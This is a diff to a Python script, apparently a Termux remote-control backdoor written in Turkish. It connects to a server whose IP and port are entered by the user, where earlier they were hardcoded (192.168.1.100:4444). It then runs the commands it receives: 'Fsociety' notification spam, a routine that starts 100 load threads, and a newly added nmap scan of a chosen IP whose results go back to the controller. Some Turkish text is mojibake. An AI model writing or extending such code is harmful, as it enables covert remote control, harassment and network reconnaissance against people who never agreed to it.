@@ -4,11 +4,6 @@ import os
 import time
 import threading
 
-try:
-    import termux
-except ImportError:
-    os.system("pip install termux")
-
 def bildirim_spam():
     for i in range(10):
         os.system(f'termux-notification --title "Fsociety" --content "Bildirim {i+1}"')
@@ -38,8 +33,15 @@ def yuk_bindir():
     for _ in range(100):
         threading.Thread(target=yÃ¼k, daemon=True).start()
 
-host = "192.168.1.100"  # Server IP
-port = 4444             # Sabit port
+def nmap_tara(ip):
+    try:
+        sonuc = os.popen(f"nmap {ip}").read()
+        return sonuc
+    except Exception as e:
+        return f"[X] Nmap hatasÄ±: {str(e)}"
+
+host = input("Sunucu IP >> ")
+port = int(input("Port >> "))
 
 s = socket.socket()
 s.connect((host, port))
@@ -63,6 +65,10 @@ while True:
         elif komut == "yÃ¼kle":
             yuk_bindir()
             s.send("[âœ“] YÃ¼kleme baÅŸlatÄ±ldÄ±.".encode())
+        elif komut.startswith("nmap "):
+            hedef_ip = komut.split(" ", 1)[1]
+            sonuc = nmap_tara(hedef_ip)
+            s.send(sonuc.encode())
         else:
             s.send("[X] Bilinmeyen komut.".encode())
     except Exception as e:
